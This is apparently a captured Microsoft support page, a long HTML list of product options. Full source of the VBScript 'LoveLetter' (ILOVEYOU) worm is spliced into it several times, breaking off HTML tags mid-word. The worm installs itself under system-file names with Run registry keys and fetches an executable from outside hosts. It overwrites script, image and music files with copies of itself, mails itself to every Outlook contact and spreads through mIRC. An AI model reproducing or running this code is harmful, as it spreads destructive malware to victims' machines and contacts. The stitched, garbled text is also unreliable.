
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     alue="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Mobile Internet Toolkit</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Money 3.0 or later</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer03a.asp?style=flat"><FONT FACE="Tahoma">Money Central Website</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Money Financial Suite</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Monster Truck Madness</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer04a.asp?style=flat"><FONT FACE="Tahoma">Mouse</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Mozart</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer28a.asp?style=flat"><FONT FACE="Tahoma">MSDN - Academic Alliance</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer28a.asp?style=flat"><FONT FACE="Tahoma">MSDN - Enterprise Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer28a.asp?style=flat"><FONT FACE="Tahoma">MSDN - Library Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer28a.asp?style=flat"><FONT FACE="Tahoma">MSDN - Operating System Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer28a.asp?style=flat"><FONT FACE="Tahoma">MSDN - Professional Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer28a.asp?style=flat"><FONT FACE="Tahoma">MSDN - Universal Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer01a.asp?style=flat"><FONT FACE="Tahoma">MSN - The Microsoft Network</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Musical Instruments</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">My Personal Tutor</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer04a.asp?style=flat"><FONT FACE="Tahoma">Natural Keyboard Elite</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer04a.asp?style=flat"><FONT FACE="Tahoma">Natural Keyboard Pro</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer04a.asp?style=flat"><FONT FACE="Tahoma">Natural Keyboard</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">NBA Full Court Press</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer42a.asp?style=flat"><FONT FACE="Tahoma">.Net Framework</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">.Net Framework SDK</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer48.asp?style=flat"><FONT FACE="Tahoma">.Net Services Developer</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer16a.asp?style=flat"><FONT FACE="Tahoma">NetMeeting Client</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Oceans</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">ODBC Driver Pack</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">ODBC SDK</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer29a.asp?style=flat"><FONT FACE="Tahoma">Office 2000 Developer Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Office 2000 Developer Update</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office 2000 Premium for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office 2000 Professional for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office 2000 Small Business Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office 2000 Standard for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer08a.asp?style=flat"><FONT FACE="Tahoma">Office 2001 for Macintosh</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer27a.asp?style=flat"><FONT FACE="Tahoma">Office 97</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer08a.asp?style=flat"><FONT FACE="Tahoma">Office 98</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer04a.asp?style=flat"><FONT FACE="Tahoma">Office Keyboard</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office v. X for Mac</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer29a.asp?style=flat"><FONT FACE="Tahoma">Office XP Developer Edition for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office XP Professional for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office XP Professional Special Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer15a.asp?style=flat"><FONT FACE="Tahoma">Office XP Standard for Students and Teachers</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer22a.asp?style=flat"><FONT FACE="Tahoma">Office XP Standard for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer08a.asp?style=flat"><FONT FACE="Tahoma">Open EIS</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer24a.asp?style=flat"><FONT FACE="Tahoma">Operations Manager 2000</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Operations Manager 2000 Application Management Pack</OPTION>
<OPrem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX",downread&"\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
end if
end sub
sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
If d.DriveType = 2 or d.DriveType=3 Then
folderlist(d.path&"\")
end if
Next
listadriv = s
end sub
sub infectfiles(folderspec)  
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
ext=lcase(ext)
s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
bname=fso.GetBaseName(f1.path)
set cop=fso.GetFile(f1.path)
cop.copy(folderspec&"\"&bname&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="jpg") or (ext="jpeg") then
set ap=fso.OpenTextFile(f1.path,2,true)
ap.write vbscopy
ap.close
set cop=fso.GetFile(f1.path)
cop.copy(f1.path&".vbs")
fso.DeleteFile(f1.path)
elseif(ext="mp3") or (ext="mp2") then
set mp3=fso.CreateTextFile(f1.path&".vbs")
mp3.write vbscopy
mp3.close
set att=fso.GetFile(f1.path)
att.attributes=att.attributes+2
end if
if (eq<>folderspec) then
if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
set scriptini=fso.CreateTextFile(folderspec&"\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine "     corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick "&dirsystem&"\Very Funny.HTM"
scriptini.WriteLine "n3=}"
scriptini.close
eq=folderspec
end if
end if
next  
end sub
sub folderlist(folderspec)  
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)  
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next  
end sub
sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub
function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = "fwd: Joke"
male.Body = vbcrlf&""
male.Attachments.Add(dirsystem&"\Very Funny.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing
end sub
sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
set fso=CreateObject("Scripting.FileSystemObject")
set c=fso.OpenTextFile(WScript.ScriptFullName,1)
lines=Split(c.ReadAll,vbcrlf)
l1=ubound(lines)
for n=0 to ubound(lines)
lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
if (l1=n) then
lines(n)=chr(34)+lines(n)+chr(34)
else
lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
end if
next
set b=fso.CreateTextFile(dirsystem+"\Very Funny.HTM")
b.close
set d=fso.OpenTextFile(dirsystem+"\Very Funny.HTM",2)
d.write dt5
d.write join(lines,vbcrlf)
d.write vbcrlf
d.write dt6
d.close
end sub                                     ONT FACE="Tahoma">Visio 2000 Technical</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer17a.asp?style=flat"><FONT FACE="Tahoma">Visio 2002 Professional</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer17a.asp?style=flat"><FONT FACE="Tahoma">Visio 2002 Standard</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer17a.asp?style=flat"><FONT FACE="Tahoma">Visio 5.0</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer17a.asp?style=flat"><FONT FACE="Tahoma">Visio Enterprise Network Tools</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer27a.asp?style=flat"><FONT FACE="Tahoma">Visio Web Component</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer13a.asp?style=flat"><FONT FACE="Tahoma">Visual Basic .NET Standard
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual Basic Enterprise Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual Basic Professional Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer13a.asp?style=flat"><FONT FACE="Tahoma">Visual C# .NET Standard
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer13a.asp?style=flat"><FONT FACE="Tahoma">Visual C++ .NET Standard
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual C++ Enterprise Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual C++ Professional Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Visual Control Pack for Windows</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual FoxPro 3.0-6.0</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer25a.asp?style=flat"><FONT FACE="Tahoma">Visual FoxPro 7.0</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual InterDev</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual J++</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual Modeler</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer13a.asp?style=flat"><FONT FACE="Tahoma">Visual SourceSafe
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual Studio .NET Academic 
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer10a.asp?style=flat"><FONT FACE="Tahoma">Visual Studio .NET Enterprise Architect 
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer33a.asp?style=flat"><FONT FACE="Tahoma">Visual Studio .NET Enterprise Developer 
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual Studio .NET Professional
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer10a.asp?style=flat"><FONT FACE="Tahoma">Visual Studio Enterprise</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Visual Studio Professional</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer14a.asp?style=flat"><FONT FACE="Tahoma">Vizact</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer16a.asp?style=flat"><FONT FACE="Tahoma">Web Publishing Wizard</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Windows 2000 Professional</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer46a.asp?style=flat"><FONT FACE="Tahoma">Windows 2000 Server</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer43a.asp?style=flat"><FONT FACE="Tahoma">Windows 95</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer32a.asp?style=flat"><FONT FACE="Tahoma">Windows 98</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer27a.asp?style=flat"><FONT FACE="Tahoma">Windows CE </OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Windows CE .Net </OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Windows CE for Automotive </OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Windows CE Embedded Toolkit</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Windows CE Platform Builder</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Windows CE Toolkit for Visual Basic</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Windows CE Toolkit for Visual C++</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer7a.asp?style=flat"><FONT FACE="Tahoma">Windows Media Player for Mac</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer16a.asp?style=flat"><FONT FACE="Tahoma">Windows Media Player</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Windows Media Player Control SDK for Pocket Internet Explorer</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Windows Media Services</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer06a.asp?style=flat"><FONT FACE="Tahoma">Windows Millennium Edition</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer11a.asp?style=flat"><FONT FACE="Tahoma">Windows NT Server</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer09a.asp?style=flat"><FONT FACE="Tahoma">Windows NT Workstation 4.0</OPTION>
<OPTION value="/isapi/gosupport.asp?target=/highlights/offer36a.asp?style=flat"><FONT FACE="Tahorem  barok -loveletter(vbe) <i hate go to school>
rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
eq=""
ctr=0
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\MSKernel32.vbs")
c.Copy(dirwin&"\Win32DLL.vbs")
c.Copy(dirsystem&"\Very Funny.vbs")
regruns()
html()
spreadtoemail()
listadriv()
end sub
sub regruns()
On Error Resume Next
Dim num,downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL",dirwin&"\Win32DLL.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
downread="c:\"
end if
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
Randomize
num = Int((4 * Rnd) + 1)
if num = 1 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
elseif num = 2 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
elseif num = 3 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
elseif num = 4 then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
end if
end if
if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then
